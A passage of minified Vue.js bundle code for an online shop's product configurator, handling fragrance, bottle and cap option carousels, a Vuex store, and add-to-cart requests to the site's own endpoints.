"),n("button",{staticClass:"btn",attrs:{disabled:e.selectedPartUnavailable},on:{click:function(t){return e.accept()}}},[n("span",{staticClass:"icon icon-check"})])])],1)},l.staticRenderFns=[],t.hot&&((s=e("vue-hot-reload-api")).install(e("vue"),!0),s.compatible&&(t.hot.accept(),t.hot.data?s.reload("data-v-7d153361",l):s.createRecord("data-v-7d153361",l)))},{"../image-layer/image-layer.vue":396,"../overlay/overlay.vue":398,"../part-options/part-options.vue":399,"../status-bar/status-bar.vue":409,vue:279,"vue-hot-reload-api":275}],398:[function(e,t,n){var r,i;r=e("../../../../../node_modules/simplebar/dist/simplebar"),i=e("../../../modules/helpers/debounce"),t.exports={name:"overlay",props:{shouldShow:Boolean,isDesktop:Boolean},methods:{onClickClose:function(){this.$emit("onClickClose")},onOverlayScroll:function(e){var t=e.target,n=t.scrollHeight,r=t.scrollTop,i=[];r+t.offsetHeight<n&&i.push("bottom-gradient"),0<r&&i.push("top-gradient"),this.overlaySlotClass=i.join(" ")}},computed:{optionTileType:function(){return this.$store.getters.currentProductPart.optionTileType}},watch:{shouldShow:function(e){var t=this;e?this.$nextTick((function(){var e=document.querySelector(".overlay-slot");t.hasScrollBar=e.scrollHeight>e.getBoundingClientRect().height})):setTimeout((function(){t.hasScrollBar=!1}),800)}},mounted:function(){var e=document.querySelector(".overlay-slot");this.isDesktop?new r(e,{autoHide:!0}).getScrollElement().addEventListener("scroll",i(this.onOverlayScroll,10)):e.addEventListener("scroll",i(this.onOverlayScroll,10))},data:function(){return{overlaySlotClass:"bottom-gradient",hasScrollBar:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var a,o="function"==typeof t.exports?t.exports.options:t.exports;o.functional,o.render=function(){var e=this.$createElement,t=this._self._c||e;return t("transition",{attrs:{name:"overlay-transition"}},[t("div",{directives:[{name:"show",rawName:"v-show",value:this.shouldShow,expression:"shouldShow"}],staticClass:"overlay"},[t("div",{staticClass:"overlay-slot",class:this.overlaySlotClass},[t("div",{staticClass:"overlay-body",class:[{"fragrance-overlay":3===this.optionTileType},{"has-scrollbar":this.hasScrollBar}]},[this._t("default")],2)]),this._v(" "),t("button",{staticClass:"overlay-close",on:{click:this.onClickClose}},[t("span",{staticClass:"icon icon-close-thick"})])])])},o.staticRenderFns=[],t.hot&&((a=e("vue-hot-reload-api")).install(e("vue"),!0),a.compatible&&(t.hot.accept(),t.hot.data?a.reload("data-v-6521e4c3",o):a.createRecord("data-v-6521e4c3",o)))},{"../../../../../node_modules/simplebar/dist/simplebar":268,"../../../modules/helpers/debounce":476,vue:279,"vue-hot-reload-api":275}],399:[function(e,t,n){var r,i,a,o,s,l;r=e("../../../modules/helpers/debounce"),i=window.dataLayer||[],a=e("../../../../../node_modules/vue-slick-carousel"),o=e("../slider-controls/slider-controls.vue"),s=e("../../../modules/util/isMobileWidth"),l=e("../image-layer/image-layer.vue"),t.exports={name:"part-options",props:{isDesktop:Boolean},components:{VueSlickCarousel:a,SliderControls:o,ImageLayer:l},methods:{getListStyle:function(e){var t=e*this.optionWidth+80,n={width:t+"px"};return t<window.innerWidth&&(n.margin="0 auto"),this.isDesktop?{}:n},getOptionDimenions:function(){return{height:this.optionHeight+"px",width:this.optionWidth+"px"}},selectPart:function(e){var t=this;if(this.selectedPart=e,3===this.optionTileType)this.$refs.carousel.goTo(this.getAbsoluteIndexInSlider(e,0));else if(this.isDesktop){var n=document.querySelectorAll("h4.category-name")[e].getBoundingClientRect(),r=document.querySelector(".part-options");r.scrollTop+=n.top-r.getBoundingClientRect().top}else{var i=document.getElementById("optionList"+e).getBoundingClientRect();this.optionSliderElement.scrollLeft+=i.x}this.setIndicatorStyle(),this.muteSliderObserver=!0,setTimeout((function(){t.muteSliderObserver=!1}),400)},selectedPartClass:function(e){return e===+this.selectedPart?"selected":""},selectOption:function(e,t){var n=this.$store.getters.selectedProductPart,r=this.$store.getters.productParts[n].depth,a=this.$store.getters.productLayers;""===this.categories[e].options[t].image&&this.$store.commit("setFragranceLabel",this.categories[e].options[t].name),a[r]=[n,e,t].join("-"),this.$emit("onClickPart",{cid:e,id:t}),this.$store.commit("setProductLayers",a),i.push({event:"configurator_selected_option",productGroup:this.categories[e].name,selection:this.categories[e].options[t].name})},optionClass:function(e,t){var n=this.$store.getters.productLayers,r=[this.$store.getters.selectedProductPart,e,t].join("-"),i=[];return 2===this.optionTileType&&i.push("has-thumb"),-1<n.indexOf(r)&&i.push("selected"),i.join(" ")},initObserver:function(){var e=this,t=new IntersectionObserver((function(t){var n,r,i=_createForOfIteratorHelper(t);try{for(i.s();!(r=i.n()).done;){var a=r.value;a.isIntersecting&&!1===e.muteSliderObserver&&(!n||a.intersectionRation>n.intersectionRatio)&&(n=a,e.selectedPart=parseInt(n.target.dataset.cid))}}catch(t){i.e(t)}finally{i.f()}e.setIndicatorStyle(),n&&n.target&&n.target.dataset&&n.target.dataset.cid&&(e.selectedPart=parseInt(n.target.dataset.cid))}),{threshold:this.isDesktop?[.5]:[.25]});this.optionSliderElement=document.getElementById("optionsSlider"),this.optionSliderElement&&this.optionSliderElement.getElementsByTagName("ul").forEach((function(e){t.observe(e)}))},onPartOptionsScroll:function(e){var t=e.target,n=t.scrollHeight,r=t.scrollTop,i=t.offsetHeight,a=[];3!==this.optionTileType&&(r+i<n&&a.push("bottom-gradient"),0<r&&a.push("top-gradient"),this.partOptionsClass=a.join(" "))},onClickReadMore:function(e){this.$emit("onClickReadMore",e)},onClickArrowLeft:function(){this.$refs.carousel.prev()},onClickArrowRight:function(){this.$refs.carousel.next()},selectCurrentSlideAsOption:function(e){var t=this.getCategoryAndProductIndexFromSlideIndex(e);this.selectOption(t.categoryIndex,t.productIndex)},getCategoryAndProductIndexFromSlideIndex:function(e){for(var t=0;t<this.categories.length;t++){if(0==(e-=this.categories[t].options.length))return{categoryIndex:t+1,productIndex:0};if(e<0)return{categoryIndex:t,productIndex:this.categories[t].options.length+e}}return{categoryIndex:0,productIndex:0}},onBeforeChange:function(e,t){this.currentSlide=t,this.selectCurrentSlideAsOption(t);var n=this.getCategoryAndProductIndexFromSlideIndex(t);this.selectedPart=n.categoryIndex,this.setIndicatorStyle(),this.checkIfCategoryIsInView()},checkIfCategoryIsInView:function(){var e=this.$refs.categoriesSelector;if(e){var t=this.selectedPart||0,n=document.querySelectorAll("ul.categories li")[t],r=n?n.getBoundingClientRect():null,i=e?e.getBoundingClientRect():null;r.left>=i.left&&r.right<=i.right||(e.scrollLeft+=r.x-i.x)}},checkIfCurrentSlide:function(e,t,n){return this.getAbsoluteIndexInSlider(e,t)===n},getAbsoluteIndexInSlider:function(e,t){var n=t;return 0<e&&(n=this.categories.slice(0,e).map((function(e){return e.options.length})).reduce((function(e,t){return e+t}),0)+t),n},setIndicatorStyle:function(e){var t=this.selectedPart||0,n=document.querySelectorAll("ul.categories li")[t],r=document.querySelector("ul.categories"),i=n?r.getBoundingClientRect():null,a=n?n.getBoundingClientRect():null,o={left:(a?a.left-i.left:0)+"px",width:(a?a.width:0)+"px"};e&&(o.transition="none"),this.indicatorStyle=o}},computed:{resources:function(){var e=this.$store.getters.resourceGlobal,t=e.readMore,n=e.learnMore;return{notInStockShort:e.notInStockShort,readMore:t,learnMore:n}},categories:function(){return this.$store.getters.currentProductPart.categories},shouldShowCategories:function(){return 1===this.optionTileType||3===this.optionTileType},optionTileType:function(){return this.$store.getters.currentProductPart.optionTileType},sliderTransitionName:function(){var e="part-options-transition";return 3!==this.optionTileType||this.isDesktop||(e="fragrance-slider-transition"),e},outOfStockType:function(){return this.$store.getters.currentProductPart.outOfStockType},optionWidth:function(){return{1:this.isDesktop?165:280,2:this.isDesktop?165:145,3:(this.isDesktop,230),4:this.isDesktop?255:280,5:this.isDesktop?165:145}[this.optionTileType]},optionHeight:function(){return{1:this.isDesktop?260:130,2:this.isDesktop?170:130,3:(this.isDesktop,360),4:this.isDesktop?216:170,5:this.isDesktop?170:130}[this.optionTileType]},shouldIncreaseHeight:function(){var e=!1;return this.isDesktop||this.categories.forEach((function(t){t.options.forEach((function(t){!1===t.available&&(e=!0)}))})),e},computedIndicatorStyle:function(){return this.indicatorStyle},isSmallDesktop:function(){return 1024<=window.innerWidth&&window.innerWidth<1440}},mounted:function(){var e=this;this.optionSliderElement=document.getElementById("optionsSlider");var t=_slicedToArray(this.$store.getters.productLayers[0].split("-"),3),n=(t[0],t[1]),i=t[2],a=this.getAbsoluteIndexInSlider(+n,+i);this.sliderSettings.initialSlide=a,this.currentSlide=a,this.shouldShowOptions=!0,3===this.optionTileType?this.selectedPart=n:(this.selectedPart=0,this.partOptionsClass="bottom-gradient"),this.setIndicatorStyle(),this.checkIfCategoryIsInView(),this.$refs.categoriesSelector&&this.$refs.categoriesSelector.addEventListener("scroll",(function(){return e.setIndicatorStyle(!0)})),"IntersectionObserver"in window&&this.initObserver(),setTimeout((function(){e.indicatorClass="allow-animation"}),300),this.isDesktop&&document.querySelector(".part-options").addEventListener("scroll",r(this.onPartOptionsScroll,10))},data:function(){return{optionsSliderStyle:{},indicatorClass:"",partOptionsClass:"",optionSliderElement:null,muteSliderObserver:!1,shouldShowOptions:!1,selectedPart:null,currentSlide:0,showLeftArrow:!0,showRightArrow:!0,isMobile:s(),indicatorStyle:{left:"0px",width:"0px"},sliderSettings:{arrows:!1,dots:!1,infinite:!1,initialSlide:0,slidesToShow:3,swipe:!1,waitForAnimate:!1,touchThreshold:500,responsive:[{breakpoint:1440,settings:{centerMode:!0,centerPadding:"28%",slidesToShow:1,slidesToScroll:1}},{breakpoint:1024,settings:{centerMode:!1,slidesToShow:3,slidesToScroll:1,swipe:!0}},{breakpoint:767,settings:{centerMode:!0,centerPadding:"18%",slidesToShow:1,slidesToScroll:1,speed:150,swipe:!0}}]}}}},t.exports.__esModule&&(t.exports=t.exports.default);var c,u="function"==typeof t.exports?t.exports.options:t.exports;u.functional,u.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"part-options",class:[e.partOptionsClass,{"part-options-fragrance-slider":3===e.optionTileType}]},[e.shouldShowCategories?n("ul",{ref:"categoriesSelector",staticClass:"categories"},e._l(e.categories,(function(t,r){return n("li",{class:e.selectedPartClass(r)},[n("a",{attrs:{href:"javascript:void(0);"},on:{click:function(t){return e.selectPart(r)}}},[n("span",{staticClass:"category-name"},[e._v(e._s(t.name))])])])})),0):e._e(),e._v(" "),e.shouldShowCategories?n("div",{staticClass:"category-indicator-scrim"},[n("div",{staticClass:"category-indicator",class:e.indicatorClass,style:e.computedIndicatorStyle,attrs:{id:"categoryIndicator"}})]):e._e(),e._v(" "),n("transition",{attrs:{name:e.sliderTransitionName}},[3===e.optionTileType?n("div",{staticClass:"fragrance-options-slider"},[n("div",{staticClass:"fragrance-slider-body"},[n("VueSlickCarousel",e._b({ref:"carousel",on:{beforeChange:e.onBeforeChange}},"VueSlickCarousel",e.sliderSettings,!1),[e.isMobile||e.isSmallDesktop?e._e():n("div",{staticClass:"slider-gap"}),e._v(" "),e._l(e.categories,(function(t,r){return e._l(t.options,(function(i,a){return n("div",{key:"optionList"+r,class:{selected:e.checkIfCurrentSlide(r,a,e.currentSlide),"slider-item":!0},style:e.getOptionDimenions(),attrs:{"data-cid":r,id:"optionList"+r}},[n("div",{staticClass:"content-wrapper"},[i.available||"bar"!=e.outOfStockType?e._e():n("span",{staticClass:"error-message"},[n("span",{staticClass:"error-badge"}),e._v("\n                                    "+e._s(e.resources.notInStockShort)+"\n                                ")]),e._v(" "),n("image-layer",{attrs:{wrapperClass:"option-image",image:i.thumb}}),e._v(" "),n("span",{staticClass:"option-category"},[e._v(e._s(t.name))]),e._v(" "),n("span",{staticClass:"option-name"},[e._v(e._s(i.name))]),e._v(" "),n("div",{staticClass:"option-more-wrapper"},[n("span",{staticClass:"option-more",on:{click:function(t){return e.onClickReadMore(i)}}},[e._v(e._s(e.resources.learnMore))])])],1)])}))})),e._v(" "),e.isMobile||e.isSmallDesktop?e._e():n("div",{staticClass:"slider-gap"})],2)],1),e._v(" "),n("slider-controls",{attrs:{showLeftArrow:e.showLeftArrow,showRightArrow:e.showRightArrow},on:{clickArrowLeft:function(t){return e.onClickArrowLeft()},clickArrowRight:function(t){return e.onClickArrowRight()}}})],1):e._e()]),e._v(" "),n("transition",{attrs:{name:"part-options-transition"}},[3!==e.optionTileType?n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowOptions,expression:"shouldShowOptions"}],staticClass:"part-options-slider",class:{"has-statusbar":e.shouldIncreaseHeight,"has-wide-tiles":4===e.optionTileType},attrs:{id:"optionsSlider"}},[e._l(e.categories,(function(t,r){return[e.isDesktop&&1<e.categories.length?n("h4",{staticClass:"category-name"},[e._v(e._s(t.name))]):e._e(),e._v(" "),n("ul",{key:"optionList"+r,staticClass:"options",style:e.getListStyle(t.options.length),attrs:{"data-cid":r,id:"optionList"+r}},e._l(t.options,(function(t,i){return n("li",{class:e.optionClass(r,i),style:e.getOptionDimenions()},[n("a",{class:{"bottle-wrapper":2===e.optionTileType,"bottle-cap-wrapper":5===e.optionTileType},attrs:{href:"javascript:void(0)"},on:{click:function(t){return e.selectOption(r,i)}}},[t.available||"badge"!=e.outOfStockType?e._e():n("span",{staticClass:"error-badge"}),e._v(" "),t.available||"bar"!=e.outOfStockType?e._e():n("span",{staticClass:"error-message"},[n("span",{staticClass:"error-badge"}),e._v("\n                                "+e._s(e.resources.notInStockShort)+"\n                            ")]),e._v(" "),2===e.optionTileType||4===e.optionTileType||5===e.optionTileType?n("image-layer",{attrs:{wrapperClass:"option-thumb",image:t.thumb}}):e._e(),e._v(" "),n("span",{staticClass:"option-name"},[e._v(e._s(t.name))]),e._v(" "),1===e.optionTileType||4===e.optionTileType?n("span",{staticClass:"option-excerpt"},[e._v(e._s(t.excerpt))]):e._e(),e._v(" "),1===e.optionTileType?n("span",{staticClass:"option-more",on:{click:function(n){return e.onClickReadMore(t)}}},[e._v(e._s(e.resources.readMore))]):e._e(),e._v(" "),4===e.optionTileType?n("span",{staticClass:"option-more",on:{click:function(n){return e.onClickReadMore(t)}}},[e._v(e._s(e.resources.learnMore))]):e._e()],1)])})),0)]}))],2):e._e()])],1)},u.staticRenderFns=[],t.hot&&((c=e("vue-hot-reload-api")).install(e("vue"),!0),c.compatible&&(t.hot.accept(),t.hot.data?c.reload("data-v-c9c0b03e",u):c.createRecord("data-v-c9c0b03e",u)))},{"../../../../../node_modules/vue-slick-carousel":277,"../../../modules/helpers/debounce":476,"../../../modules/util/isMobileWidth":516,"../image-layer/image-layer.vue":396,"../slider-controls/slider-controls.vue":408,vue:279,"vue-hot-reload-api":275}],400:[function(e,t,n){var r,i;r=e("../product-parts/product-parts.vue"),i=e("../status-bar/status-bar.vue"),t.exports={name:"parts-footer",components:{ProductParts:r,StatusBar:i},props:{isDesktop:Boolean,isVisible:Boolean},methods:{accept:function(){this.$emit("clickDonePartsButton")},cancel:function(){this.$emit("clickCancelPartsButton")}},computed:{resources:function(){var e=this.$store.getters.resourcePartsFooter,t=e.heading,n=e.body,r=this.$store.getters.resourceGlobal;return{heading:t,body:n,accept:r.accept,decline:r.decline}},shouldShowStatusBar:function(){var e,t=_createForOfIteratorHelper(this.$store.getters.productLayers);try{for(t.s();!(e=t.n()).done;){var n=_slicedToArray(e.value.split("-"),3),r=n[0],i=n[1],a=n[2];if(!this.$store.getters.productParts[r].categories[i].options[a].available)return!0}}catch(e){t.e(e)}finally{t.f()}return!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var a,o="function"==typeof t.exports?t.exports.options:t.exports;o.functional,o.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"parts-footer",attrs:{id:"partsFooter"}},[e.isDesktop?n("div",{staticClass:"footer-header"},[n("h3",{domProps:{innerHTML:e._s(e.resources.heading)}}),e._v(" "),n("p",{domProps:{innerHTML:e._s(e.resources.body)}})]):e._e(),e._v(" "),n("product-parts",{attrs:{isDesktop:e.isDesktop}}),e._v(" "),n("status-bar",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowStatusBar,expression:"shouldShowStatusBar"}]}),e._v(" "),n("div",{staticClass:"button-row"},[n("button",{staticClass:"btn btn--secondary",on:{click:function(t){return e.cancel()}}},[e._v(e._s(e.resources.decline))]),e._v(" "),n("button",{staticClass:"btn",attrs:{disabled:e.shouldShowStatusBar},on:{click:function(t){return e.accept()}}},[e._v(e._s(e.resources.accept))])])],1)},o.staticRenderFns=[],t.hot&&((a=e("vue-hot-reload-api")).install(e("vue"),!0),a.compatible&&(t.hot.accept(),t.hot.data?a.reload("data-v-79542b3e",o):a.createRecord("data-v-79542b3e",o)))},{"../product-parts/product-parts.vue":405,"../status-bar/status-bar.vue":409,vue:279,"vue-hot-reload-api":275}],401:[function(e,t,n){var r=e("vue"),i=e("vuex"),a=e("./product-configurator-store"),o=e("axios"),s=e("../../product-page-handler"),l=e("../../pages/product/addToCart"),c=".js-product-configurator",u=".js-product-configurator-trigger",d=!1,p={productId:"",configurationId:"",productConfiguration:"",actionType:"",actionData:""},h=function(e){if(e.stopPropagation(),m())return!1;p.productId=$(e.currentTarget).data("product-id"),p.configurationId=$(e.currentTarget).data("configuration-id"),p.productConfiguration=$(e.currentTarget).data("product-configuration"),p.actionType=$(e.currentTarget).data("action-type")||"",p.actionData=$(e.currentTarget).data("action-data")||"",history.pushState("","",window.location.href),f(),A()},f=function(){var e='\n        <div id="app-configurator" class="'.concat(c.substr(1),'">\n        </div>\n    ');$("body").append(e)},A=function(){var t=e("./product-configurator/product-configurator.vue"),n=a.init(i);d=new r({el:c,store:n,components:{ProductConfigurator:t},computed:{isProduction:function(){return!0},productId:function(){return p.productId.toString()},configurationId:function(){return p.configurationId},productConfiguration:function(){return JSON.stringify(p.productConfiguration)},actionType:function(){return p.actionType},actionData:function(){return p.actionData}},template:'\n            <product-configurator\n                :isProduction="isProduction"\n                :productId="productId"\n                :configurationId="configurationId"\n                :productConfiguration="productConfiguration"\n                :actionType="actionType"\n                :actionData="actionData">\n            </product-configurator>\n        '})},m=function(){return!1!==d},v={init:function(){0<$(u).length&&(r.use(i),window.eventBus=window.eventBus||new r,window.eventBus.$on("addConfiguredProductToCart",(function(e){var t=window.Urls.addProduct.toString()||"";o.post(t,{},{params:{pid:e.product,childPids:Object.keys(e.selectedComponents).map((function(t){return e.selectedComponents[t].id})).join(","),personalizedName:e.personalizedName}}).then((function(t){"updatePDP"==e.actionType&&s.updatePage(e),$(".js-product-image-mobile").attr("data-src",e.primaryImage.src),l.updateMiniCartOnAddProduct(t.data,!1)}))})),window.eventBus.$on("configuratorChanged",(function(e){var t="";switch(e.actionType){case"redirectTo":t=e.updateData.urlParameterName+"=",e.updateData&&e.updateData.isTalisman?t+=String.format(e.updateData.urlParameterValueFormat,e.product,e.selectedComponents.fragrance.id,e.selectedComponents.bottle.id,e.selectedComponents.cap.id,e.selectedComponents.talisman.id):t+=String.format(e.updateData.urlParameterValueFormat,e.product,(e.selectedComponents.fragrance||e.selectedComponents.wax).id,(e.selectedComponents.bottle||e.selectedComponents.candleholder).id),location.href="".concat(e.actionData,"?").concat(t);break;case"updatePDP":s.updatePage(e)}})),window.eventBus.$on("configuratorClosed",(function(){d=!1,$("#product-configurator").remove()})),window.onpopstate=function(){window.eventBus.$emit("shouldCloseConfigurator")},$(document).on("click",u,h))}};t.exports=v},{"../../pages/product/addToCart":566,"../../product-page-handler":594,"./product-configurator-store":402,"./product-configurator/product-configurator.vue":403,axios:7,vue:279,vuex:281}],402:[function(e,t,n){var r={init:function(t){var n={addSnapshot:function(e){e.snapshots.push(e.productLayers)},useSnapshot:function(e){e.productLayers=e.snapshots.pop()},popSnapshot:function(e){e.snapshots.pop()},setFooterMode:function(e,t){e.footerMode=t},setFragranceLabel:function(e,t){e.fragranceLabel=t},setProductLayers:function(e,t){e.productLayers=t.join("||")},setUpsellData:function(e,t){e.upsellData=t},setSelectedProductPart:function(e,t){e.selectedProductPart=t},confirmProductPartSelected:function(e){null===e.selectedProductPart||null==e.selectedProductPart||e.savedProductParts.includes(e.selectedProductPart)||e.savedProductParts.push(e.selectedProductPart)},setProductParts:function(t,n){t.productParts?(e("vue").set(t,"productParts",n),t.productParts=n):t.productParts=n},setProductId:function(e,t){e.productId=t},setResources:function(e,t){e.resources=t}};return new t.Store({state:{snapshots:[],footerMode:"partsFooter",fragranceLabel:"Imperial Rose",selectedProductPart:0,savedProductParts:[],productLayers:"0-0-0||1-0-0||2-0-0||3-0-0",productParts:[],resources:{},productId:null,upsellData:null},getters:{snapshots:function(e){return e.snapshots},footerMode:function(e){return e.footerMode},fragranceLabel:function(e){return e.fragranceLabel},selectedProductPart:function(e){return e.selectedProductPart},savedProductParts:function(e){return e.savedProductParts},productLayers:function(e){return e.productLayers.split("||")},productParts:function(e){return e.productParts},statusMessages:function(e){return e.resources.statusMessages},resources:function(e){return e.resources},resourceGlobal:function(e){return e.resources.global},resourceIntroMessage:function(e){return e.resources.introMessage},resourceStatusMessages:function(e){return e.resources.statusMessages},resourceProductParts:function(e){return e.resources.productParts},resourcePartsFooter:function(e){return e.resources.partsFooter},categories:function(e){return e.categories},currentProductPart:function(e){return e.productParts[e.selectedProductPart]},upsellData:function(e){return e.upsellData},productId:function(e){return e.productId}},mutations:n})}};t.exports=r},{vue:279}],403:[function(e,t,n){var r,i,a,o,s,l,c,u,d,p,h,f,A;r=e("../product-intro/product-intro.vue"),i=e("../assembled-product/assembled-product.vue"),a=e("../assembled-product-zoom/assembled-product-zoom.vue"),o=e("../parts-footer/parts-footer.vue"),s=e("../options-footer/options-footer.vue"),l=e("../result-footer/result-footer.vue"),c=e("../result-slider/result-slider.vue"),u=e("../upsell/footer/upsell-footer.vue"),d=e("../../../modules/util/isMobileWidth"),p=e("../../../modules/helpers/isTabletView"),h=e("../../../modules/helpers/scroll"),f=e("axios"),A=e("../../../certificate-view"),t.exports={name:"product-configurator",components:{ProductIntro:r,AssembledProduct:i,AssembledProductZoom:a,PartsFooter:o,OptionsFooter:s,ResultFooter:l,ResultSlider:c,UpsellFooter:u},props:{isProduction:Boolean,productId:String,configurationId:String,productConfiguration:String,actionType:String,actionData:String},methods:{clearLastHistoryState:function(){window.history.back()},onOverlayChange:function(e){this.isOverlayVisible=e},onClickCancelDialogButton:function(){this.shouldShowDialog=!1,this.clearLastHistoryState()},onClickCancelPartsButton:function(){this.$store.commit("setProductLayers",this.initialProductLayers),this.shouldShowConfigurator=!1,this.clearLastHistoryState()},onClickDonePartsButton:function(){if(this.shouldShowUpsellPage)return this.upsellBackButtonClicked=!1,void this.$store.commit("setFooterMode","upsellFooter");this.shouldShowResultScreen=!0,this.$store.commit("setFooterMode","resultFooter")},onClickDoneUpsellButton:function(){this.shouldShowResultScreen=!0,this.$store.commit("setFooterMode","resultFooter")},onClickResultAddToCartButton:function(){var e=this.updatePageData;e.updateData.isTalisman?A.show({callback:function(t){this.shouldShowConfigurator=!1,this.clearLastHistoryState(),e.personalizedName=t,setTimeout((function(){window.eventBus.$emit("addConfiguredProductToCart",e)}),500)}.bind(this)}):(this.shouldShowConfigurator=!1,this.clearLastHistoryState(),setTimeout((function(){window.eventBus.$emit("addConfiguredProductToCart",e)}),500))},onClickResultDetailsButton:function(){var e=this;this.shouldShowConfigurator=!1,this.clearLastHistoryState(),setTimeout((function(){window.eventBus.$emit("configuratorChanged",e.updatePageData)}),500)},onClickResultBackButton:function(){this.shouldShowResultScreen=!1,this.shouldShowResultFooterButtons=!0,this.shouldShowUpsellPage?this.$store.commit("setFooterMode","upsellFooter"):this.$store.commit("setFooterMode","partsFooter")},onClickUpsellBackButton:function(){var e=this;this.upsellBackButtonClicked=!0,this.shouldShowResultScreen=!1,this.shouldShowResultFooterButtons=!0,setTimeout((function(){e.$store.commit("setFooterMode","partsFooter")}),this.isTablet?500:0)},onHideResultFooter:function(){this.shouldShowResultFooterButtons=!1},onOptionFooterChange:function(){this.$store.commit("confirmProductPartSelected")},onProductStyleSet:function(e){this.initialProductZoomStyle=e}},watch:{shouldShowConfigurator:function(e){var t=this;!0===e?(this.initialProductLayers=JSON.parse(JSON.stringify(this.$store.getters.productLayers)),h.disableScroll(),setTimeout((function(){t.shouldShowBackdrop=!0}),100),setTimeout((function(){t.shouldShowProduct=!0}),1100),setTimeout((function(){t.shouldShowFooter=!0}),2100),setTimeout((function(){t.partsFooterClass="invert-direction"}),2400)):(h.enableScroll(),this.shouldShowBackdrop=!1,setTimeout((function(){t.shouldShowFooter=!1,t.shouldShowProduct=!1,t.shouldShowAssembledProduct=!1,t.shouldShowResultScreen=!1,t.partsFooterClass="",window.eventBus.$emit("configuratorClosed"),window.eventBus.$off("shouldCloseConfigurator")}),800))}},computed:{shouldShowUpsellPage:function(){return this.$store.getters.upsellData.shouldShowUpsellPage},footerMode:function(){return this.$store.getters.footerMode},introMessage:function(){return this.$store.getters.resourceIntroMessage},dialogResources:function(){return{close:window.Resources.CLOSE||"Close",isLoading:window.Resources.CONFIGURATOR_IS_LOADING||"",isError:window.Resources.CONFIGURATOR_HAS_ERROR||""}},shouldShowIntro:function(){return this.shouldShowConfigurator&&this.isDataReady&&this.shouldShowBackdrop},shouldShowPartsFooter:function(){return"partsFooter"===this.footerMode&&this.shouldShowFooter},shouldShowUpsellFooter:function(){return"upsellFooter"===this.footerMode&&this.shouldShowFooter},shouldShowOptionsFooter:function(){return"optionsFooter"===this.footerMode&&this.shouldShowFooter},shouldShowResultFooter:function(){return"resultFooter"===this.footerMode&&this.shouldShowFooter},shouldShowAssembledProductImage:function(){return!!this.shouldShowUpsellFooter||!this.shouldShowResultScreen},shouldShowAssembledProductZoomImage:function(){var e=3===this.optionTileType&&"optionsFooter"===this.footerMode||this.shouldShowUpsellFooter||this.shouldShowResultScreen;return this.isDesktop&&!this.shouldShowResultScreen||!this.isDesktop&&!e},transitionName:function(){var e="switch-footers-transition";return 3!==this.optionTileType||this.isDesktop||(e="full-height-footer-transition"),e},optionTileType:function(){return this.$store.getters.currentProductPart.optionTileType},queryParams:function(){return _objectSpread({product:this.productId},JSON.parse(this.productConfiguration))},updatePageData:function(){var e,t=this,n=this.$store.getters.productLayers,r=this.$store.getters.productParts,i=JSON.parse(JSON.stringify(this.$store.getters.resources.updateData)),a={},o=_createForOfIteratorHelper(n);try{for(o.s();!(e=o.n()).done;){var s=_slicedToArray(e.value.split("-"),3),l=s[0],c=s[1],u=s[2],d=r[l];a[d.resourceId]=d.categories[c].options[u]}}catch(e){o.e(e)}finally{o.f()}var p=null;i.isTalisman?(p=i.talismanPrimaryImagePlaceholder).src=String.format(p.urlFormat,a.bottle.EAN,a.fragrance.EAN,a.talisman.EAN,a.cap.EAN):p=(a.bottle||a.candleholder).image;var h=this.actionType,f=this.actionData;if(this.shouldShowUpsellPage&&!this.isOriginalProduct){var A=this.$store.getters.upsellData.products.find((function(e){return e.id===t.$store.getters.productId}));h=A.actionType,f=A.actionData}return{selectedComponents:JSON.parse(JSON.stringify(a)),product:this.$store.getters.productId,actionType:h,actionData:f,configurationId:this.configurationId,primaryImage:p,upsellPageExists:this.shouldShowUpsellPage,updateData:i}},isOriginalProduct:function(){return this.productId===this.$store.getters.productId}},created:function(){var e=this;window.eventBus.$on("shouldCloseConfigurator",(function(){e.shouldShowConfigurator=!1}))},mounted:function(){var e=this,t=Urls.getConfigurableProduct;this.dialogMessage=this.dialogResources.isLoading,this.dialogTimer=setTimeout((function(){e.shouldShowDialog=!0}),3e3),f.get(t,{timeout:1e4,params:this.queryParams}).then((function(t){clearTimeout(e.dialogTimer),e.$store.commit("setProductId",e.productId),e.$store.commit("setProductParts",t.data.productParts),e.$store.commit("setResources",t.data.resources),e.$store.commit("setProductLayers",t.data.productLayers),e.$store.commit("setUpsellData",t.data.upsellData),e.shouldShowDialog=!1,e.isDataReady=!0})).then((function(){e.shouldShowConfigurator=!0})).catch((function(t){e.dialogMessage=e.dialogResources.isError,e.shouldShowDialog=!0,e.clearLastHistoryState(),e.isProduction}))},data:function(){return{isDataReady:!1,isMobile:d(),isTablet:p(),isDesktop:!(d()||p()),isOverlayVisible:!1,initialProductZoomStyle:0,partsFooterClass:"",dialogTimer:null,upsellBackButtonClicked:!1,shouldShowDialog:!1,shouldShowFooter:!1,shouldShowProduct:!1,shouldShowResultScreen:!1,shouldShowUpsellScreen:!1,shouldShowResultFooterButtons:!0,shouldShowAssembledProduct:!1,shouldShowBackdrop:!1,shouldShowConfigurator:!1,initialProductLayers:"",dialogMessage:""}}},t.exports.__esModule&&(t.exports=t.exports.default);var m,v="function"==typeof t.exports?t.exports.options:t.exports;v.functional,v.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("transition",{attrs:{name:"product-configurator-transition"}},[e.isDataReady?n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowConfigurator,expression:"shouldShowConfigurator"}],staticClass:"product-configurator",attrs:{id:"product-configurator"}},[e.shouldShowIntro?n("product-intro",[n("span",{domProps:{innerHTML:e._s(e.introMessage)}})]):e._e(),e._v(" "),n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowProduct,expression:"shouldShowProduct"}],staticClass:"scene"},[n("assembled-product-zoom",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowAssembledProductZoomImage,expression:"shouldShowAssembledProductZoomImage"}],attrs:{isDesktop:e.isDesktop,productZoomStyle:e.initialProductZoomStyle}}),e._v(" 